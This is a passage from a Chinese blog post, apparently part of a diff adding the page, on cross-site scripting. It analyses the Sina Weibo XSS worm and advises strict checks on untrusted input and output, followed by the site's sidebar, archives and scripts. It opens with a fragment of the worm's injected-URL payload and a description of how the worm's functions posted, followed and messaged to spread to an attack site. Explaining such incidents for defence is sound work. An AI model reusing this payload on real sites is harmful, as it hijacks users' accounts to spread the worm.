rel="external">http://weibo.com/pub/topic&quot;;&#39;,5000</a>);</pre><br><br>这段代码相对来讲，还是有点含量的，它使微博广场的URL在请求中注入了JS文件，JS请求完成后，会自动执行，并借发布的微博（包含了对攻击站点的链接）等对2kt.cn的站点完成了攻击。可以看到，其中的main函数，它调用了publish、follow、message几个函数，帮你做那些坏事。<br><br>&nbsp;<br><br><strong><span style="font-size:18px">总结</span></strong><br><br>可见XSS攻击的方式其实还是很多的，让你防不慎防。但是，有时你会发现他们的某些共性——注入再利用浏览器自动执行。所以，你必须在不可信的输入与输出上严&#26684;把关！<br><br><span style="font-size:16px"><strong>参考与引用：</strong></span><br><br><a href="http://coolshell.cn/articles/4914.html" target="_blank" rel="external"><span style="font-size:13px">酷壳：新浪微博的XSS攻击</span></a><br><br><a href="http://msdn.microsoft.com/zh-cn/library/aa973813.aspx" target="_blank" rel="external"><span style="font-size:13px">MSDN</span></a><br><br></div>
+
+<pre><code>&lt;<span class="tag">div</span>  style=<span class="string">"padding-top:20px"</span>&gt;         
+</code></pre><p>版权声明：本文为博主原创文章，未经博主允许不得转载。</p>
+<pre><code><span class="tag">&lt;/div&gt;</span>
+</code></pre><p></p></div><p></p>
+<!-- Baidu Button BEGIN -->
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://vinoyang.com/2012/01/14/浅谈跨网站脚本攻击-XSS-的手段与防范-简析新浪微博XSS攻击事件/" data-id="cii1bfd6n0010gaz25y4z82ct" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2012/01/23/辞旧迎新——年度web开发合辑，新年大放送/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          辞旧迎新——年度web开发合辑，新年大放送
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2012/01/07/浅谈简单工作流设计——责任链模式配合策略与命令模式的实现/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">浅谈简单工作流设计——责任链模式配合策略与命令模式的实现</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+  <section id="comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="post-浅谈跨网站脚本攻击-XSS-的手段与防范-简析新浪微博XSS攻击事件" data-title="浅谈跨网站脚本攻击(XSS)的手段与防范(简析新浪微博XSS攻击事件)" data-url="http://vinoyang.com/2012/01/14/浅谈跨网站脚本攻击-XSS-的手段与防范-简析新浪微博XSS攻击事件/"></div>
+    <!-- 多说评论框 end -->
+    <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+    <script type="text/javascript">
+    var duoshuoQuery = {short_name:'vinoyang'};
+      (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+         || document.getElementsByTagName('body')[0]).appendChild(ds);
+      })();
+      </script>
+    <!-- 多说公共JS代码 end -->
+  </section>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/RabbitMQ/">RabbitMQ</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Zookeeper/">Zookeeper</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/async/">async</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/disque/">disque</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flume/">flume</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/messagebus/">messagebus</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/morphline/">morphline</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rate-limit/">rate-limit</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/分布式锁/">分布式锁</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/日志系统/">日志系统</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/消息总线/">消息总线</a><span class="tag-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/RabbitMQ/" style="font-size: 10px;">RabbitMQ</a> <a href="/tags/Zookeeper/" style="font-size: 10px;">Zookeeper</a> <a href="/tags/async/" style="font-size: 10px;">async</a> <a href="/tags/disque/" style="font-size: 10px;">disque</a> <a href="/tags/flume/" style="font-size: 10px;">flume</a> <a href="/tags/messagebus/" style="font-size: 10px;">messagebus</a> <a href="/tags/morphline/" style="font-size: 10px;">morphline</a> <a href="/tags/rate-limit/" style="font-size: 10px;">rate-limit</a> <a href="/tags/redis/" style="font-size: 20px;">redis</a> <a href="/tags/分布式锁/" style="font-size: 10px;">分布式锁</a> <a href="/tags/日志系统/" style="font-size: 10px;">日志系统</a> <a href="/tags/消息总线/" style="font-size: 20px;">消息总线</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">八月 2015</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">五月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">四月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/02/">二月 2015</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">一月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">十二月 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/10/">十月 2014</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">九月 2014</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/06/">六月 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">四月 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">三月 2014</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/02/">二月 2014</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">十二月 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/10/">十月 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/09/">九月 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/07/">七月 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/05/">五月 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/03/">三月 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/02/">二月 2013</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/01/">一月 2013</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">十二月 2012</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">十一月 2012</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/09/">九月 2012</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/08/">八月 2012</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/06/">六月 2012</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/05/">五月 2012</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/04/">四月 2012</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/03/">三月 2012</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/02/">二月 2012</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/01/">一月 2012</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/12/">十二月 2011</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/11/">十一月 2011</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/10/">十月 2011</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/09/">九月 2011</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/08/">八月 2011</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/07/">七月 2011</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/06/">六月 2011</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/05/">五月 2011</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/03/">三月 2011</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/02/">二月 2011</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/07/">七月 2010</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/06/">六月 2010</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/05/">五月 2010</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/04/">四月 2010</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/03/">三月 2010</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/02/">二月 2010</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2010/01/">一月 2010</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2009/10/">十月 2009</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2015/12/11/messagebus-refactor-model/">消息总线之模型重构</a>
+          </li>
+        
+          <li>
+            <a href="/2015/11/20/build-log-sys-with-flume-and-morphline/">日志系统之Flume采集加morphline解析</a>
+          </li>
+        
+          <li>
+            <a href="/2015/10/30/messagebus-refactor-simplify-client/">消息总线重构之简化客户端</a>
+          </li>
+        
+          <li>
+            <a href="/2015/08/29/a-lightweight-async-task-invoker-based-on-redis-and-disque/">一个基于redis和disque实现的轻量级异步任务执行器</a>
+          </li>
+        
+          <li>
+            <a href="/2015/08/23/redis-incr-implement-rate-limit/">redis实现访问频次限制的几种方式</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Weibo show</h3>
+    <div class="widget-weibo">
+      <iframe width="100%" height="450" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=550&fansRow=2&ptype=1&speed=0&skin=2&isTitle=0&noborder=0&isWeibo=1&isFans=0&uid=1958166695&verifier=9c2d28b9&colors=dddddd,dddddd,666666,0069a4,dddddd&dpc=1"></iframe>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Github</h3>
+    <div class="widget-github">
+      <script data-name="yanghua" src="http://octocard.in/o.js"></script>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2015 yanghua1127@gmail.com<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/projects" class="mobile-nav-link">Projects</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav>
+    
+
+<script src="http://apps.bdimg.com/libs/jquery/2.0.3/jquery.min.js"></script>
+<script type="text/javascript">
+//<![CDATA[
+if (typeof jQuery == 'undefined') {
+  document.write(unescape("%3Cscript src='/js/jquery-2.0.3.min.js' type='text/javascript'%3E%3C/script%3E"));
+}
+// ]]>
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>
+
+
+<script src="/js/script.js" type="text/javascript"></script>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?36c1573c11e45ea0f6419af5f2f04760";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+  </div>
+</body>
+</html>
